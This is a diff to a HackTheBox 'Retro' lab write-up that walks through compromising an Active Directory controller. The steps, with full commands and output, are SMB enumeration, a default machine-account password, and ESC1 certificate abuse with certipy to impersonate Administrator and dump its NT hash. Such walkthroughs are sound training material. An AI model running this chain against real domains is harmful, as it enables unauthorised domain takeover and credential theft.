@@ -1,14 +1,16 @@
-![[Pasted image 20250705213732.png]]
+<div align="center">
+<img src="Pasted image 20250705213732.png">
+</div>
 
 ### Guided Mode
 ### Task 1 - What is the Fully Qualified Domain Name (FQDN) of the Domain Controller in Retro?
 
-Firtst let's add the machine to our hosts file. 
+First let's add the machine to our hosts file. 
 ```
 echo "10.129.196.125 retro.htb" >> /etc/hosts
 ```
 
-Now let's perform our nmap scan. Per my usual 
+Now let's perform our nmap scan. Per my usual,
 ```
 nmap -sV -sC -Pn -T4 10.129.196.125
 ```
@@ -79,7 +81,7 @@ Let's add this to /etc/hosts
 ```
 echo 10.129.196.125 DC.retro.vl >> /etc/hosts
 
-and for safe measure
+and for safe measure,
 
 echo 129.196.125 retro.vl >> /etc/hosts
 ```
@@ -91,7 +93,9 @@ So from our nmap we can see 445 open so let's connect anonymously.
 smbclient -L \\10.129.196.125\ 
 ```
 
-![[Pasted image 20250705215111.png]]
+<div align="center">
+<img src="Pasted image 20250705215111.png">
+</div>
 
 So **task 2**: Trainees
 
@@ -103,9 +107,13 @@ So now let's login via our anonymous account to the share
 smbclient \\\\\\10.129.196.125\\Trainees -U 'guest'
 ```
 
-![[Pasted image 20250705215450.png]]
+<div align="center">
+<img src="Pasted image 20250705215450.png">
+</div>
 
-![[Pasted image 20250705220254.png]]
+<div align="center">
+<img src="Pasted image 20250705220254.png">
+</div>
 ... so there seems to be no clear indication of a "username" located here. Let's enumerate the smb server via rid-brute since we have guest access.
 
 ```
@@ -169,9 +177,227 @@ SMB         10.129.196.125  445    DC               Trainees        READ
 ```
 
 So our answer for **task 5** is Notes. Connecting to this share will reveal our first flag.
-![[Pasted image 20250705223907.png]]
+<div align="center">
+<img src="Pasted image 20250705223907.png">
+</div>
 
-Enter user.txt flag and let's continue.
+Enter user.txt flag (**Task 6**) and let's read the contents of ToDo.txt
+```
+Thomas,
 
-#### Task 6 - What is the name of the old machine account that has pre-windows-2000 compatibility?
+after convincing the finance department to get rid of their ancient banking software
+it is finally time to clean up the mess they made. We should start with the pre-created
+computer account. That one is older than me.
 
+Best
+
+James
+```
+
+#### Task 7 - What is the name of the old machine account that has pre-windows-2000 compatibility?
+
+So back when we did our SMB RID cycling directly below our user Trainee was a machine named BANKING$. 
+
+#### Task 8 - What is the error code returned when authenticating as the `BANKING machine account with the default password?
+
+We can make a very quick inference here from our ToDo. We're given the snippet "We should perform cleanup starting with the *pre created* computer account.." coupled with ancient banking software my initial first guess was correct. Much like our user login for trainee, we've got banking\$:banking as a login. Let's test it out.
+
+```
+~/hackthebox/Retro > nxc smb 10.129.196.125 -u BANKING$ -p banking --generate-tgt ticket
+SMB         10.129.196.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.196.125  445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+~/hackthebox/Retro > ls                                                                   00:31:35
+hosts  Important.txt  nmap  test.txt  ToDo.txt  user.txt
+~/hackthebox/Retro > ls                                                                   00:31:40
+~/hackthebox/Retro > nxc smb 10.129.196.125 -u BANKING$ -p banking -k --generate-tgt ticket
+SMB         10.129.196.125  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.129.196.125  445    DC               [+] retro.vl\BANKING$:banking
+SMB         10.129.196.125  445    DC               [+] TGT saved to: ticket.ccache
+SMB         10.129.196.125  445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=ticket.ccache
+~/hackthebox/Retro > export KRB5CCNAME=ticket.ccache                                   4s 00:32:45
+~/hackthebox/Retro > klist                                                                00:33:18
+Ticket cache: FILE:ticket.ccache
+Default principal: BANKING$@RETRO.VL
+
+Valid starting       Expires              Service principal
+07/06/2025 00:32:45  07/06/2025 10:32:45  krbtgt/RETRO.VL@RETRO.VL
+        renew until 07/07/2025 00:32:44
+~/hackthebox/Retro >
+```
+
+Now as for answering the question for task 8-- just a quick run of 
+```
+~ > smbclient //dc.retro.vl/Notes -U 'BANKING                                           00:52:44
+Password for [WORKGROUP\BANKING$]:
+session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+```
+
+So... **step 8: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+
+#### Task 9: What is the name of the Certificate Authority (CA) Common Name (CN) that issue certificates in the Active Directory Certificate Services environment?
+
+I had spent some time digging around for a shell before getting around to this question, but it all led back to to this. ADCS.
+
+
+A run of certipy shows our vulnerability and next steps.
+
+```
+~/hackthebox/Retro > certipy find -vulnerable -k -u 'banking$@retro.vl' -no-pass -target dc.retro.vl -ns 10.129.246.172 -stdout
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for 'retro-DC-CA'
+[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : retro-DC-CA
+    DNS Name                            : DC.retro.vl
+    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
+    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
+    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
+    Certificate Validity End            : 2028-07-23 21:13:50+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : RETRO.VL\Administrators
+      Access Rights
+        ManageCa                        : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        ManageCertificates              : RETRO.VL\Administrators
+                                          RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Enroll                          : RETRO.VL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : RetroClients
+    Display Name                        : Retro Clients
+    Certificate Authorities             : retro-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2023-07-23T21:17:47+00:00
+    Template Last Modified              : 2023-07-23T21:18:39+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : RETRO.VL\Administrator
+        Full Control Principals         : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Owner Principals          : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Dacl Principals           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+        Write Property Enroll           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+```
+
+To quickly answer **task 9**--  retro-DC-CA.
+#### Task 10: Retro has an ADCS template that is vulnerable to a vulnerability which can be used to exploit Certificate enrollment by requesting certificates impersonating other users. What is the specific ESC pseudo name of this vulnerability?
+
+**Task 10:** ESC1
+
+So the template RetroClients is our vulnerability, and leveraging our BANKING$ account, we can request a certificate for any user. The simple reason this works: BANKING$ can enroll in this template and request a SAN. One thing to note here and I've made this mistake a dozen times. In our template we can see the key size is 4096, this is going to have to be added to our next command or we'll get an error. Let's go for a quick rid brute again using banking$ to grab an SID of our target (Administrator of course,) and request a certificate. 
+
+
+
+```
+~/hackthebox/Retro > lookupsid.py -k dc.retro.vl                                          16:51:08
+/home/jam3z/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Impacket v0.13.0.dev0+20250701.160936.2e87ade - Copyright Fortra, LLC and its affiliated companies
+
+[*] Brute forcing SIDs at dc.retro.vl
+[*] StringBinding ncacn_np:dc.retro.vl[\pipe\lsarpc]
+[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
+```
+
+We *should* know following the domain sid just tack on -500 for Administrator and we should be ready to go request admin certificate.
+
+```
+~/hackthebox/Retro > certipy req -ca retro-DC-CA -template RetroClients -k -u 'banking$@retro.vl' -target dc.retro.vl -upn 'administrator@retro.vl' -key-size 4096 -sid  S-1-5-21-2983547755-698260136-4283918172-500
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
+[!] DNS resolution failed: The DNS query name does not exist: dc.retro.vl.
+[!] Use -debug to print a stacktrace
+[!] DNS resolution failed: The DNS query name does not exist: RETRO.VL.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 12
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@retro.vl'
+[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+
+Actually took a bit of spamming and different formations of requests on this one to get it working (blaming HackTheBox on this,) but now we're ready to authenticate with our pfx and get a hash.
+
+```
+~/hackthebox/Retro > certipy auth -pfx administrator.pfx -dc-ip 10.129.246.172            17:27:14
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@retro.vl'
+[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Using principal: 'administrator@retro.vl'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
+```
+
+Now let's just pass this over to evil-winrm, get our root flag and call it a day.
+
+<div align="center">
+<img src="Pasted image 20250707172939.png">
+</div>
+
+...and we've succesfully rooted Retro. 
+
+<div align="center">
+<img src="Pasted image 20250707173432.png">
+</div>
